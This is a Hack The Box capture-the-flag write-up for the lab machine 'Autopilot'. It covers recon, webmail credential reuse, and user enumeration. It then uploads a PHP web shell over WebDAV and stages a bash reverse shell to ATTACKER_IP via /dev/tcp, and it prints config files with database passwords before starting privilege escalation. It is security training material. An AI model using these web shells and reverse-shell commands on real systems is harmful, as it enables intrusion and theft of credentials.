---
tags:
  - HTB
  - MACHINE
link: https://app.hackthebox.com/machines/Autopilot
difficulty: Insane
os: Windows
pov: red
description:
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2ccae76-9dec-4da0-a15f-e879aaffd0ca-1789999840.png
solved:
solve date:
machine no.: 4
release date: 2026-10-17
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Autopilot Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2ccae76-9dec-4da0-a15f-e879aaffd0ca-1789999840.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://app.hackthebox.com/users/1809572">nedmoeca</a></p>
    <p style="margin: 0;">Created by: <a href="https://app.hackthebox.com/users/168546">ctrlzero</a></p>
    <p style="margin: 0;">Difficulty: Insane</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Debrief


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Store the target address in a shell variable

**Command:**

```bash
export IP=TARGET_IP
echo $IP
```

To clear the variable:

```bash
unset IP
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.3 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=127 time=148 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=127 time=148 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=127 time=145 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=127 time=160 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 145.203/150.389/160.038/5.702 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.4 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 1.4.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo`

**Breakdown:**

| Component         | Purpose             | Simple Explanation                                                                                                                                                                                                                                 |
| ----------------- | ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`            | Port scanner        | Sends packets to each port and classifies the response as open, closed, or filtered.                                                                                                                                                               |
| `-p-`             | Port range          | Shorthand for ports 1–65535. Without it nmap checks only its built-in list of 1000 common ports.                                                                                                                                                   |
| `--min-rate 5000` | Timing floor        | Forces at least 5000 packets per second instead of letting nmap's adaptive timing throttle down. This is what makes a full-range scan finish in seconds rather than minutes. Note the **double** dash.                                             |
| `-Pn`             | Skip host discovery | Treats the host as up without pinging first. HTB machines commonly drop ICMP; without this, nmap may conclude the host is down and scan nothing.                                                                                                   |
| `\| grapo`        | Custom filter       | Local zsh function: `tee /dev/tty \| grep -oP '^\d+(?=/tcp\s+open)' \| paste -sd, \| sed 's/^/\n/'`. Prints the full nmap output to the terminal while extracting open port numbers into a comma-separated list ready to paste into the next scan. |

**Result:**

```shell
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-18 11:41 -0400
Nmap scan report for TARGET_IP
Host is up (0.16s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 27.27 seconds

443
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p 443 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-18 11:43 -0400
Nmap scan report for TARGET_IP
Host is up (0.15s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx
| ssl-cert: Subject: commonName=grommunio.autopilot.htb/organizationName=Autopilot/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:grommunio.autopilot.htb, DNS:autodiscover.autopilot.htb, DNS:mail.autopilot.htb
| Not valid before: 2026-07-15T16:20:23
|_Not valid after:  2101-06-27T16:20:23
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry 
|_/
| tls-alpn: 
|   h2
|   http/1.1
|   http/1.0
|_  http/0.9
| http-title: grommunio Web
|_Requested resource was https://TARGET_IP/web/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (91%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 2.6.32 - 3.13 (85%), Linux 3.10 - 4.11 (85%), Linux 3.2 - 4.14 (85%), Linux 3.4 - 3.10 (85%), Linux 4.15 (85%), Linux 5.14 - 6.8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   147.29 ms 10.10.14.1
2   147.42 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.3 Scan Results Analysis

| Port | **Service** | **Version** | **Analysis**                                                                                                                                                                                                                                             | **Simple Explanation**                                                                                                                              |
| ---- | ----------- | ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| 443  | ssl/http    | nginx       | grommunio Web portal (open-source Exchange replacement); redirects to `/web/`. Cert SAN leaks three vhosts: `grommunio.autopilot.htb`, `autodiscover.autopilot.htb`, `mail.autopilot.htb`. No SMB/RDP/Kerberos exposed, so any AD sits behind this host. | The single open door. Every piece of functionality rides over this one HTTPS service, so the foothold must come through the web app on Linux first. |
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.5 Map the target hostnames locally

The TLS certificate and the grommunio web application are hostname-aware: nginx routes by virtual host and the app expects to be reached by name, not by a raw IP. Before browsing anything, map the certificate's hostnames to the target in `/etc/hosts`. Add the three names from the certificate SAN (`grommunio`, `autodiscover`, `mail`) plus the apex domain `autopilot.htb`: every SAN is a subdomain of that apex, which makes `autopilot.htb` the organization and, later, the Active Directory domain, and both mail routing and autodiscover reach for the bare name.

**Command:** `echo "TARGET_IP  grommunio.autopilot.htb autodiscover.autopilot.htb mail.autopilot.htb autopilot.htb" | sudo tee -a /etc/hosts`

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `echo "..."` | Build hosts line | Produces one line mapping the target IP to all four hostnames. |
| `grommunio / autodiscover / mail .autopilot.htb` | Cert SAN vhosts | The three names listed in the certificate's Subject Alternative Name; nginx serves different content per virtual host, so each must resolve. |
| `autopilot.htb` | Apex / AD domain | The bare domain. Not in the SAN, but implied as the apex of all three SAN names; mailboxes are `user@autopilot.htb` and the AD realm is `autopilot.htb`, so the bare name gets queried. Forgetting it is a common time-sink on this box. |
| `sudo tee -a` | Append as root | Appends the line to the root-owned `/etc/hosts`; `-a` appends rather than overwriting existing entries. |

**Result:**

```shell
TARGET_IP  grommunio.autopilot.htb autodiscover.autopilot.htb mail.autopilot.htb autopilot.htb
```

With the hostnames resolving, the webmail at `https://grommunio.autopilot.htb/web/` and the other vhosts are reachable by name, so the TLS certificate validates and the application loads correctly.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Authenticate to grommunio Web

With the hostnames resolving, authenticate to the webmail using the assumed-breach credentials provided for the engagement. This is the natural first move: before reaching for any exploit, log in as the user you were given and see what that account can already read.

**Method (web UI, primary):** Browse to `https://grommunio.autopilot.htb/web/`, enter the credentials, and click **Sign in**.

- Username: `deborah.hernandez`
- Password: `8F5cgp@tC8g@`

![[autopilot_grommunio_before_login.png]]

**Result:** Authentication succeeds and the grommunio Web mailbox loads for `deborah.hernandez` (Human Resources). The folder tree shows the standard Inbox/Sent/Drafts set plus `Public Folders - autopilot.htb` and an "Open Shared Mails +" option (both noted for later, as loose mail ACLs can expose other users' content).

![[autopilot_grommunio_after_login.png]]

**What this gives you:**

- Confirmed the supplied credentials are valid against grommunio Web, giving an authenticated starting position inside the mail suite.
- Confirmed the mail domain is `autopilot.htb` and the account naming convention is `firstname.lastname`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Read the mailbox: the account-provisioning thread

A mailbox is primary-source intelligence: on a corporate box the correspondence usually names the people and accounts worth targeting. Read the messages rather than skimming subject lines. In Deborah's Sent Items (and the reply in her Inbox) is a two-message thread, "Congratulations on the promotion!", between Deborah (HR), Joshua Harris, and Stephanie Lewis.

**Original message (Deborah Hernandez, HR, to joshua.harris, cc stephanie.lewis):**

```text
Good morning Josh,
Congratulations on your promotion! Stephanie will provision your new account sometime today
so look for her e-mail once she arrives into the office this morning.
She will provide more details at that time.

Once again, congratulations and if you have any questions please feel free to reach out.

Regards,
Deborah Hernandez
Human Resources
Autopilot Solutions
```

**Reply (Joshua Harris, IT Support, to Deborah, cc stephanie.lewis):**

```text
Hi Deborah,
Thank you so much! I'm really excited to get to assist where I can

Regards,
Joshua Harris
IT Support
Autopilot Solutions
```

![[autopilot_grommunio_promotion_email.png]]
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.1 Reading the thread like an attacker

An onboarding email is a privilege map. Three things fall out of it:

- **Joshua Harris** (`joshua.harris@autopilot.htb`), currently IT Support, is being promoted, and a new account is being provisioned for him. A freshly provisioned "promotion" account is almost always more privileged than the day-job one, so Joshua is a target to track.
- **Stephanie Lewis** (`stephanie.lewis@autopilot.htb`) is the person who provisions the account ("Stephanie will provision your new account"). Whoever holds account-creation rights sits high in the privilege hierarchy, which makes Stephanie the apex target of the engagement.
- A follow-up email from Stephanie ("look for her e-mail... more details at that time") is referenced but not present in this mailbox. A referenced-but-missing sensitive message is a flag to remember: protected or restricted correspondence may exist elsewhere.

**What this gives you:**

- Key findings:
  - Two named, high-value targets with their email addresses: `joshua.harris@autopilot.htb` (promotion / new privileged account) and `stephanie.lewis@autopilot.htb` (the provisioner, apex target).
  - The organisation's privilege hierarchy stated in plain text: HR requests, Stephanie provisions, Joshua is elevated.
  - A hint that additional sensitive correspondence (Stephanie's "details" email) exists and is not in this mailbox.
<div align="center">
<br>
<br>
※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.3 Enumerate the domain users via the Global Address List

A mail server authenticated as any user is a free directory dump: the Global Address List (GAL) is the organisation-wide address book the server maintains, and reading it yields every user account. That list seeds later Active Directory work (AS-REP roasting, Kerberoast target selection, password-spray candidate lists), so capture it in full.

#### 2.3.1 Dead end: the personal Contacts module is empty

The CONTACTS tab shows only Deborah's personal contacts folder, which holds no entries on this box. User enumeration therefore does not come from this module; it comes from the server-side Global Address List, reached through the recipient picker.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.2 Open the Global Address List

Start a new message (MAIL, then New), click the **To** button to open the address-book dialog, and switch the address-book dropdown (top-left of that dialog) from "Contacts" to **Global Address List**. The dialog then lists every mailbox in `autopilot.htb`.

**Result:** The Global Address List returns the full company directory: 45 user accounts, every one in the form `firstname.lastname@autopilot.htb`. Both named targets from the provisioning thread are present, `joshua.harris` and `stephanie.lewis`. The listing spans two screens of the dialog.

![[autopilot_grommunio_gal_1.png]]

![[autopilot_grommunio_gal_2.png]]

Captured and saved to `users.txt`:

```text
margaret.adams
sarah.allen
james.baker
patricia.baker
cynthia.campbell
christopher.collins
dorothy.davis
ashley.edwards
dorothy.garcia
william.garcia
andrew.green
lisa.green
timothy.hall
joshua.harris
susan.harris
deborah.hernandez
edward.hernandez
donna.johnson
amanda.king
patricia.king
stephanie.lewis
john.martinez
edward.nelson
michael.parker
laura.phillips
paul.phillips
betty.ramirez
stephanie.ramirez
carol.rivera
barbara.roberts
christopher.roberts
deborah.robinson
dorothy.thomas
sharon.thomas
steven.thompson
rebecca.walker
susan.walker
deborah.white
charles.wilson
linda.wilson
matthew.wilson
jessica.wright
sarah.wright
george.young
ryan.young
```

The same list can be produced non-interactively from the address-book JSON response (DevTools, Network tab) rather than by scrolling:

```bash
# paste the globaladdressbook JSON response into gab.json first
grep -oE '[a-z]+\.[a-z]+@autopilot\.htb' gab.json | sort -u | sed 's/@.*//' | tee users.txt
```

**What this gives you:**

- Key findings:
  - 45 valid domain usernames enumerated from one authenticated view, with no brute force, no lockout risk, and no noise.
  - Both email-thread targets confirmed in the directory: `joshua.harris` (promotion / incoming privileged account) and `stephanie.lewis` (the provisioner / apex target).
  - Naming convention confirmed as `firstname.lastname`, which later helps predict related or service-account names (for example `sa-` and `da-` prefixed variants seen deeper in the box).
  - `users.txt` is now the seed list for later Kerberos work (AS-REP roasting, Kerberoasting) and password spraying once a path into Active Directory opens.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation

### 3.1 Credential reuse into grommunio Files (Nextcloud)

The webmail cannot execute code, so the next move is to reach the other applications this grommunio suite serves on the same host and reuse the one credential already held. grommunio Files is a rebranded Nextcloud instance served at `/files/`; Nextcloud brings file upload and WebDAV, both routes to code execution.

**Method (web UI, primary):** Browse to `https://grommunio.autopilot.htb/files/` and sign in with the same mailbox credentials.

- Username: `deborah.hernandez`
- Password: `8F5cgp@tC8g@`

**Result:** Login succeeds. The landing page is a Nextcloud file manager branded "grommunio Files" (footer: "grommunio Files, filesync and sharing"), opening on an empty **All files** view (`0 B used`). The account has a working, authenticated Nextcloud session at `/files/index.php/apps/files/files`.

![[autopilot_grommunio_files_login.png]]

![[autopilot_grommunio_files_dashboard.png]]
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.1.1 Why the mailbox password works here (theory)

A separate application accepting the mailbox password is not a coincidence; it is an architecture choice worth understanding, because it is the single flaw that chains the whole suite together.

This Nextcloud has no local password store for domain users. It is configured with an external user backend that forwards each login, over HTTP Basic Auth, to grommunio's DAV endpoint (`https://grommunio.autopilot.htb/dav`). When Deborah logs into Files, Nextcloud simply asks grommunio's DAV "are these credentials valid?" and trusts the answer. The practical effect is single-sign-on by delegation: one mailbox password authenticates webmail, DAV, and Nextcloud alike. (The backing `config.php` that defines this is read directly later, during Linux privilege escalation, which confirms the mechanism rather than just inferring it.)

The security lesson: credential reuse baked into the architecture means one leaked or assumed-breach password is not access to one app, it is access to every app in the suite, including the one (Nextcloud) that lets you write files to disk.

**What this gives you:**

- An authenticated Nextcloud session reached purely by reusing the assumed-breach mailbox password, no exploit required.
- The core foothold primitive: Nextcloud exposes file upload and standard WebDAV, so the next step is to write an attacker-controlled PHP file into the web root and execute it.
<div align="center">
<br>
<br>
※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Upload a PHP web shell over WebDAV

An authenticated Nextcloud session exposes standard WebDAV, so a file can be written to the user's storage with a single HTTP `PUT`. `curl` speaks WebDAV natively with its `-T` (upload) flag, so no special client is needed.

##### WebDAV in one line (theory)

WebDAV is a set of HTTP extensions (verbs like `PUT`, `MOVE`, `PROPFIND`) that let an HTTP server behave like a read/write network drive. Nextcloud exposes it at `remote.php/webdav/`. Writing a `.php` file there places it inside the account's file storage on disk, which becomes interesting only because this deployment also serves that storage directory back over the web (handled in 3.3).

**Command:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php

curl -k -u 'deborah.hernandez:8F5cgp@tC8g@' \
  -T shell.php \
  'https://grommunio.autopilot.htb/files/remote.php/webdav/shell.php' \
  -w '\nHTTP %{http_code}\n'
```

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php` | Build the payload | A minimal PHP web shell: it runs whatever is passed in the `cmd` URL parameter via the system shell and returns the output. Deliberately tiny and dependency-free so it is reliable. |
| `curl` | HTTP/WebDAV client | Sends the request; with `-T` it performs a WebDAV `PUT`. |
| `-k` | Ignore TLS errors | The host uses a self-signed certificate, so certificate validation is skipped. |
| `-u 'deborah.hernandez:8F5cgp@tC8g@'` | Basic Auth | Authenticates the upload with the reused mailbox credentials (the DAV-delegated login from 3.1). |
| `-T shell.php` | WebDAV upload | Uploads the local `shell.php` to the remote path (an HTTP `PUT`), rather than downloading. |
| `.../files/remote.php/webdav/shell.php` | Write endpoint | Nextcloud's WebDAV path. Correct for *writing* the file (not for executing it, see 3.3). |
| `-w '\nHTTP %{http_code}\n'` | Show status | Prints the final HTTP status code so the upload result is unambiguous. |

**Result:**

```shell
HTTP 201
```

HTTP 201 (Created) confirms the server accepted and stored `shell.php`.

**What this gives you:**

- An attacker-controlled PHP file is now written into Deborah's Nextcloud storage on disk.
- The file is not yet executed; running it requires the correct URL, which is the data-directory path rather than the WebDAV path (next step).
<div align="center">
<br>
<br>
※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.3 Execute the shell and confirm RCE

The upload endpoint only stores the file; it will not run it. This deployment, however, serves Nextcloud's data directory directly over the web, so the shell is reachable and executed as PHP at the data-directory path, which mirrors the on-disk layout `/<user>/files/`.

##### The execution-URL trap (why three URLs behave differently)

The same uploaded file responds three different ways depending on how it is requested, and only one of them runs the code:

- `/files/remote.php/webdav/shell.php` (the WebDAV path): returns the file as a download. WebDAV serves file contents, it does not hand them to the PHP interpreter.
- The in-browser file previewer: sandboxes and renders the file for viewing; it never executes PHP.
- `/files/data/<user>/files/shell.php` (the data directory): served by the web server as a normal web path, so PHP here is executed. This is the one that yields code execution.

The data directory on disk is `/var/lib/grommunio-files/data` (confirmed when `config.php` is read during privilege escalation), and the web path mirrors that layout, hence `/files/data/deborah.hernandez/files/`.

**Command:**

```bash
curl -k 'https://grommunio.autopilot.htb/files/data/deborah.hernandez/files/shell.php?cmd=id'
```

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `curl -k` | Request the shell | Fetches the URL, ignoring the self-signed certificate. No auth is needed because the data path is served without it. |
| `/files/data/deborah.hernandez/files/shell.php` | Execution path | The data-directory URL that mirrors where the WebDAV upload landed on disk; requesting it here runs the PHP. |
| `?cmd=id` | Command input | The value passed to the shell's `$_GET['cmd']`; `id` prints the current user, a safe first command to confirm execution. |

**Result:**

```shell
uid=462(grofiles) gid=462(grofiles) groups=462(grofiles)
```

**What this gives you:**

- Confirmed remote code execution on the Linux host via the uploaded web shell.
- The execution context is the service account `grofiles` (uid 462), which runs grommunio Files' PHP. This is the foothold identity for the Linux privilege-escalation chain that follows.
<div align="center">
<br>
<br>
※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.4 Upgrade to an interactive reverse shell

Driving the target one URL at a time is slow and loses state between requests. Trade the single-command web shell for a full interactive reverse shell. This is a Linux host, so the payload is bash, not PowerShell (a common time-sink here).

The staged approach: host a bash reverse-shell script on the attacker, have the web shell download it, then execute it.

**Commands:**

```bash
# Attacker: reverse-shell script, served over HTTP
cat > rev.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
python3 -m http.server 8000

# Attacker: listener (separate terminal)
nc -lvnp 4444

# Trigger via the web shell (separate terminal): fetch then run
curl -k 'https://grommunio.autopilot.htb/files/data/deborah.hernandez/files/shell.php?cmd=curl%20http://ATTACKER_IP:8000/rev.sh%20-o%20/tmp/rev.sh'
curl -k 'https://grommunio.autopilot.htb/files/data/deborah.hernandez/files/shell.php?cmd=bash%20/tmp/rev.sh'
```

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` | Reverse shell | Opens an interactive bash whose input/output are redirected over a TCP socket back to the attacker, using bash's built-in `/dev/tcp` pseudo-device (no extra tooling needed on the target). |
| `python3 -m http.server 8000` | Payload host | Serves `rev.sh` so the target can pull it. |
| `nc -lvnp 4444` | Listener | Catches the incoming connection; `-l` listen, `-v` verbose, `-n` no DNS, `-p 4444` port. |
| `cmd=curl ... -o /tmp/rev.sh` | Stage the script | First request: target downloads the script to a writable path (`/tmp`). `%20` are URL-encoded spaces. |
| `cmd=bash /tmp/rev.sh` | Fire it | Second request: target runs the script, which connects back to the listener. |

**Result:**

```shell
# python http.server
TARGET_IP - - [18/Oct/2026 16:45:06] "GET /rev.sh HTTP/1.1" 200 -

# nc listener
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 49804
bash: cannot set terminal process group (1303): Inappropriate ioctl for device
bash: no job control in this shell
grofiles@grommunio:/var/lib/grommunio-files/data/deborah.hernandez/files$
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.4.1 Stabilize the TTY

The raw shell has no job control or line editing (the `cannot set terminal process group` message). Upgrade it to a usable PTY. Either PTY-spawn method below works; use whichever the target has:

```bash
# on the target shell: spawn a PTY (use EITHER line)
script -qc /bin/bash /dev/null                    # util-linux, present on almost every Linux host
python3 -c 'import pty; pty.spawn("/bin/bash")'   # equivalent, needs python3 on the target

# then, regardless of which you used:
# background with Ctrl+Z, then on the attacker:
stty raw -echo; fg
# press Enter, then back in the target shell:
export TERM=xterm-256color
```
<div align="center">
<br>
<br>
</div>

##### Why a PTY, and `script` vs `python` (theory)

A netcat reverse shell is just a raw pipe with no controlling terminal: no job control, no line editing or history, no tab-completion, and any program that demands a TTY (`sudo`, `su`, `ssh`, `vi`, `top`) misbehaves or refuses to run. Spawning a PTY gives the remote bash a real pseudo-terminal and fixes all of that.

`script -qc /bin/bash /dev/null` and `python3 -c 'import pty; pty.spawn("/bin/bash")'` do the same job (allocate a PTY and run bash inside it). The only practical difference is dependencies: `script` ships with util-linux and exists on virtually every Linux host, so it is the safer default when you do not yet know what is installed, whereas the python one-liner needs a `python3` interpreter present. Pick whichever the box has.

The PTY alone is only half the fix. The follow-up `stty raw -echo; fg` hands your local terminal's raw keystrokes directly to the remote PTY (stopping doubled or missing echo), and `export TERM=xterm-256color` (plus setting a correct window size) makes full-screen programs render correctly.

**What this gives you:**

- A stable, interactive foothold on the Linux host as the service account `grofiles`.
- Exploitation is complete. The user flag is not readable here: on this box `user.txt` lives in `/root/`, so it is obtained only after reaching root in the privilege-escalation chain.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation

### 4.1 Foothold context and escalation plan

The foothold runs as `grofiles` (uid 462), the unprivileged service account behind grommunio Files. It cannot read `user.txt` (which lives in `/root/`), so the objective now is root on the Linux host.

This host has a tightly chained privilege-escalation path: each stage leaks the credential or primitive for the next. The full route to root, documented stage by stage in Section 5:

| Stage | From -> To | Primitive / leak |
| ----- | ---------- | ---------------- |
| 1 | `grofiles` enumeration | Read grommunio Files `config.php` (MySQL creds #1, architecture) |
| 2 | `grofiles` -> `gromox` | World-writable PHP-FPM socket (FastCGI to the gromox pool), then read `/etc/gromox/*.cfg` (MySQL creds #2 and the AD bind account) |
| 3 | Admin API takeover | Reset the Admin API admin password in the correct database (`grommunio.users`, not `grofiles.oc_users`) |
| 4 | Admin API -> `root` | Weaponise the Postfix multi-instance wrapper via the Admin API `dbconf` plus a service restart |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc

### 5.1 Stage 1: Read the grommunio Files config (MySQL creds #1 and architecture)

The first loot is the configuration of the application the foothold already runs as. App configs hold database credentials and reveal how the system is wired.

**Command:**

```bash
cat /usr/share/grommunio-files/config/config.php
```

**Result (salient lines):**

```php
'overwritewebroot' => '/files',
'datadirectory' => '/var/lib/grommunio-files/data',
'passwordsalt' => 'MUALqqNY+feKhBI/VHBg2ORy1Lkm6t',
'secret' => 'CJUmUrtinWFu/KX1v2kB06G3mYkHPGA7mNrChZVHey2Mdbrw',
'trusted_domains' => array ( 0 => 'localhost', 1 => 'grommunio.autopilot.htb', 2 => 'autopilot.htb', 3 => 'mail.autopilot.htb' ),
'dbtype' => 'mysql',
'dbname' => 'grofiles',
'dbuser' => 'grofiles',
'dbpassword' => 'DvZPzO4k1uQCzL5D',          // MySQL creds #1 (grofiles DB)
'user_backends' => array (
  0 => array (
    'arguments' => array ( 0 => 'https://grommunio.autopilot.htb/dav' ),
    'class' => '\\OCA\\UserExternal\\BasicAuth',
  ),
),
```

**What this gives you:**

- MySQL credentials #1: `grofiles` / `DvZPzO4k1uQCzL5D` for the `grofiles` database.
- Architectural confirmation of the credential reuse from 3.1: `user_backends` uses `\OCA\UserExternal\BasicAuth` and delegates authentication to grommunio's DAV endpoint, so one mailbox password authenticates webmail, DAV and Nextcloud alike.
- Confirmation that `datadirectory` is `/var/lib/grommunio-files/data`, matching the `/files/data/...` web-execution path used for the foothold.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 5.1.1 Rabbit hole: the wrong database

MySQL creds #1 open only the `grofiles` (Nextcloud) database and its `oc_users` table. Changing the `oc_users` admin hash here does NOT unlock the grommunio Admin API: the Admin API authenticates against a different database (`grommunio`, table `users`). Resetting the Nextcloud admin (for example `occ user:resetpassword admin`) is equally useless for the Admin API. Treat creds #1 as confirmation and side-loot, and move on to finding a path to the `gromox` service account.

<div align="center">
<br>
<br>
※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.2 Stage 2: Abuse the world-writable gromox PHP-FPM socket (execute as gromox)

The next credential set lives in `/etc/gromox/`, readable only by `gromox`. To read it, run code as `gromox`. A misconfigured PHP-FPM socket provides exactly that.
<div align="center">
<br>
<br>
</div>

#### 5.2.1 Enumerate the FPM pools and sockets

```bash
find / -type s -perm -0666 2>/dev/null          # world-writable sockets
ls -la /run/gromox/
ps aux | grep -i 'fpm\|php' | grep -v grep       # which pools run as which user
ls -la /etc/php8/fpm/php-fpm.d/
grep -rEn 'listen|^user|^group|listen\.(owner|group|mode)' /etc/php8/fpm/php-fpm.d/ 2>/dev/null
```

Each PHP-FPM pool runs as its own user and listens on its own unix socket, and every pool socket here is created world-writable (`listen.mode = 0666`):

| Pool | Runs as | Socket | Mode |
| ---- | ------- | ------ | ---- |
| gromox | `gromox` | `/run/php-fpm/php-gromox-fpm.sock` | 0666 |
| grommunio-web | `groweb` | `/run/php-fpm/php-grommunio-web-fpm.sock` | 0666 |
| grommunio-files | `grofiles` (us) | `/run/php-fpm/php-grommunio-files-fpm.sock` | 0666 |
| grommunio-dav | `grodav` | `/run/php-fpm/php-grommunio-dav-fpm.sock` | 0666 |
| grommunio-sync | `grosync` | `/run/php-fpm/php-grommunio-sync-fpm.sock` | 0666 |

Two access details decide the exploit:

- `/run/php-fpm` is `drwx--x--x` (0711): it cannot be listed (so `ls` and `find` fail inside it), but "other" has the traverse bit, so a socket inside is reachable by its exact path, which the pool config gave us.
- `cgi-fcgi` is not installed (`which cgi-fcgi` is empty), so a dependency-free Python FastCGI client is used instead.

